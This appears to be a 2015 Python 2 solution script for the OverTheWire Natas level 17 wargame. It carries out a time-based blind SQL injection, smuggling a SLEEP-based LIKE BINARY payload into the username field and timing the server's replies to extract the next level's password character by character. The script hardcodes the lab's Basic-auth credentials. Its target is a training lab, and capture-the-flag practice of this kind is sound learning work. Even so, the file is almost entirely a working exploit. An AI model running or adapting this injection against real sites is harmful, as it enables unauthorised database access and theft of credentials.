# -*- coding: utf-8 -*-
"""
Created on Sun Mar  8 13:44:05 2015

@author: George
"""

import urllib2, urllib, base64, timeit



#function to find password.
def get_password():
    
    #create characters I'm going to loop through.
   characters='abcdefghijklmnopqrstuvwxyz'
   characters+=characters.upper()
   characters+='0123456789'
   starts_with=''
   for i in range(32):
       for character in characters: 
           string=starts_with+character+'%'
                
        #Connect to the web page, send username and password, then
        #send our query as a parameter when we open the url.
    	    
           request = urllib2.Request("http://natas17.natas.labs.overthewire.org/index.php")
           base64string = base64.encodestring('%s:%s' % ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')).replace('\n', '')
           request.add_header("Authorization", "Basic %s" % base64string)   
           params=urllib.urlencode({'username':'natas18"-IF(username="natas18" and password LIKE BINARY+"'+string+'",SLEEP(3),0);#'})

           #Time how long it takes the server to respond, if greater than 3 seconds
           #then assume sql statement has evaluated to true and so we have the right character.      
       
           start=timeit.default_timer()   
           result = urllib2.urlopen(request,params)
           finish=timeit.default_timer()-start        
           if finish > 3:
               print character
               result.close()
               starts_with+=character            
               break
           result.close()
       
            
   print starts_with         
                        
            
get_password()            
